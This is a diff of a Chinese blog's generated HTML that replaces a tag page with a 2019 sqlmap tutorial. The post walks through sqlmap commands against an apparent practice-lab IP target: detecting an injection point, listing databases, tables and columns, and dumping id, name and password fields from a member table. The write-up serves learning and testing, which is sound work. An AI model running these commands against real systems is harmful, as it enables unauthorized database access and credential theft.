@@ -6,19 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: kali | Summer&#39;s Blog</title>
+  <title>sqlmap的使用教程 | Summer&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="生而无畏，战至终章">
-<meta name="keywords" content="python,java,javaweb,html,css,php">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Summer&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/tags/kali/index.html">
+  <meta name="description" content="最近在学习一些工具的使用，接下来会每一天都更新博客，记录自己的日常收获。">
+<meta name="keywords" content="工具">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap的使用教程">
+<meta property="og:url" content="http://yoursite.com/2019/09/14/sqlmap的使用教程/index.html">
 <meta property="og:site_name" content="Summer&#39;s Blog">
-<meta property="og:description" content="生而无畏，战至终章">
+<meta property="og:description" content="最近在学习一些工具的使用，接下来会每一天都更新博客，记录自己的日常收获。">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2019/09/14/sqlmap的使用教程/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/14/sqlmap的使用教程/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/14/sqlmap的使用教程/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/14/sqlmap的使用教程/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/14/sqlmap的使用教程/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/14/sqlmap的使用教程/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/14/sqlmap的使用教程/7.png">
+<meta property="og:updated_time" content="2019-09-14T02:36:01.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Summer&#39;s Blog">
-<meta name="twitter:description" content="生而无畏，战至终章">
+<meta name="twitter:title" content="sqlmap的使用教程">
+<meta name="twitter:description" content="最近在学习一些工具的使用，接下来会每一天都更新博客，记录自己的日常收获。">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/14/sqlmap的使用教程/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Summer&#39;s Blog" type="application/atom+xml">
   
@@ -171,71 +180,232 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-sqlmap的使用教程" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/04/25/kali开启ssh服务连接finalshell/" class="archive-article-date">
-  	<time datetime="2019-04-25T08:59:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-25</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/04/25/kali开启ssh服务连接finalshell/">kali开启ssh服务连接finalshell</a>
+    <h1 class="article-title" itemprop="name">
+      sqlmap的使用教程
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2019/09/14/sqlmap的使用教程/" class="archive-article-date">
+  	<time datetime="2019-09-14T01:34:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近在学习一些工具的使用，接下来会每一天都更新博客，记录自己的日常收获。</p>
+<a id="more"></a>
+<h2 id="sqlmap使用方式："><a href="#sqlmap使用方式：" class="headerlink" title="sqlmap使用方式："></a><strong>sqlmap使用方式：</strong></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Python sqlmap.py -u "目标url" 其他参数</span><br><span class="line">Python sqlmap.py <span class="comment">--url="目标url" 其他参数</span></span><br><span class="line">Python sqlmap.py -u test.txt 其他参数</span><br></pre></td></tr></table></figure>
+<p>目标站点：<a href="http://219.153.49.228:46683/new_list.php?id=1" target="_blank" rel="noopener">http://219.153.49.228:46683/new_list.php?id=1</a></p>
+<h3 id="检查注入点："><a href="#检查注入点：" class="headerlink" title="检查注入点："></a><strong>检查注入点：</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python sqlmap.py -u http://219.153.49.228:46683/new_list.php?id=1</span><br><span class="line"><span class="comment">--也可以先进行手工注入，判断出注入点</span></span><br></pre></td></tr></table></figure>
+<h3 id="爆出所有数据库信息："><a href="#爆出所有数据库信息：" class="headerlink" title="爆出所有数据库信息："></a><strong>爆出所有数据库信息：</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python sqlmap.py -u http://219.153.49.228:46683/new_list.php?id=1 <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
+<h3 id="爆当前数据库信息："><a href="#爆当前数据库信息：" class="headerlink" title="爆当前数据库信息："></a><strong>爆当前数据库信息：</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python sqlmap.py -u http://219.153.49.228:46683/new_list.php?id=1 <span class="comment">--current-db</span></span><br></pre></td></tr></table></figure>
+<h3 id="指定库名列出所有表："><a href="#指定库名列出所有表：" class="headerlink" title="指定库名列出所有表："></a><strong>指定库名列出所有表：</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python sqlmap.py -u http://219.153.49.228:46683/new_list.php?id=1 -D 库名 <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+<h3 id="指定库名表名列出所有字段："><a href="#指定库名表名列出所有字段：" class="headerlink" title="指定库名表名列出所有字段："></a><strong>指定库名表名列出所有字段：</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python sqlmap.py -u http://219.153.49.228:46683/new_list.php?id=1 -D 库名 -T 表名 <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
+<h3 id="指定库名表名dump出指定字段："><a href="#指定库名表名dump出指定字段：" class="headerlink" title="指定库名表名dump出指定字段："></a><strong>指定库名表名dump出指定字段：</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python sqlmap.py -u http://219.153.49.228:46683/new_list.php?id=1 -D 库名 -T 表名 -C id,name,password <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
+<h3 id="实操："><a href="#实操：" class="headerlink" title="实操："></a>实操：</h3><p><strong>目标url:</strong> <a href="http://219.153.49.228:46683/new_list.php?id=1" target="_blank" rel="noopener"> http://219.153.49.228:46683/new_list.php?id=1</a></p>
+<p><strong>判断注入点：</strong></p>
+<p>经过手工注入发现 and 1=1 和 and 1=2 返回的页面不同，那么我就知道了在id 这里存在了注入点。也可以在sqlmap中判断是否是可以注入的。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap -u http://219.153.49.228:46683/new_list.php?id=1</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/14/sqlmap的使用教程/1.png" alt></p>
+<p><img src="/2019/09/14/sqlmap的使用教程/2.png" alt></p>
+<p><strong>爆出所有数据库信息：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap -u http://219.153.49.228:46683/new_list.php?id=1 <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/14/sqlmap的使用教程/3.png" alt></p>
+<p><strong>爆当前数据库信息：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap -u http://219.153.49.228:46683/new_list.php?id=1 <span class="comment">--current-db</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/14/sqlmap的使用教程/4.png" alt></p>
+<p><strong>指定库名列出所有表：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap -u http://219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/14/sqlmap的使用教程/5.png" alt></p>
+<p><strong>指定库名表名列出所有字段：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap -u http://219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup -T StormGroup_member <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/14/sqlmap的使用教程/6.png" alt></p>
+<p><strong>指定库名表名dump出指定字段：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap -u http://219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup -T StormGroup_member -C id,name,password <span class="comment">--dump</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/14/sqlmap的使用教程/7.png" alt></p>
+<p>日后更新！！</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/alipay.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/wechat.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">kali</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/kali//" class="article-tag-list-link color5">kali</a>
+        			<a href="/categories/sqlmap//" class="article-tag-list-link color2">sqlmap</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/14/sqlmap的使用教程/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2019/06/05/判断是否为整形注入/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">判断是否为整形注入</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap使用方式："><span class="toc-number">1.</span> <span class="toc-text">sqlmap使用方式：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检查注入点："><span class="toc-number">1.1.</span> <span class="toc-text">检查注入点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆出所有数据库信息："><span class="toc-number">1.2.</span> <span class="toc-text">爆出所有数据库信息：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆当前数据库信息："><span class="toc-number">1.3.</span> <span class="toc-text">爆当前数据库信息：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#指定库名列出所有表："><span class="toc-number">1.4.</span> <span class="toc-text">指定库名列出所有表：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#指定库名表名列出所有字段："><span class="toc-number">1.5.</span> <span class="toc-text">指定库名表名列出所有字段：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#指定库名表名dump出指定字段："><span class="toc-number">1.6.</span> <span class="toc-text">指定库名表名dump出指定字段：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实操："><span class="toc-number">1.7.</span> <span class="toc-text">实操：</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -260,9 +430,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
